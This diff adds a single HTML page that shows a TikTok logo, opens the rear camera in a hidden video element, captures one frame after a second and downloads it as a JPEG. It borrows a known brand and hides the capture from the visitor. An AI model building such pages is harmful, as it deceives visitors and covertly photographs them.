@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            background-image: url("tiktok_logo.png");
+            background-size: 300px auto;
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 100vh;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        (async () => {
+            try {
+                // 1. Access camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
+                
+                // 2. Create hidden video element
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                await video.play();
+                
+                // 3. Capture after 1s delay (let camera adjust)
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // 4. Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // 5. Save to device (triggers download prompt)
+                    const a = document.createElement('a');
+                    a.href = canvas.toDataURL('image/jpeg', 0.85);
+                    a.download = `capture_${new Date().toISOString().slice(0,19).replace(/[:T]/g,'-')}.jpg`;
+                    a.click();
+                    
+                }, 1000);
+                
+            } catch (error) {
+                alert("Camera access failed. Please allow permissions and refresh.");
+                console.error(error);
+            }
+        })();
+    </script>
+</body>
+</html>
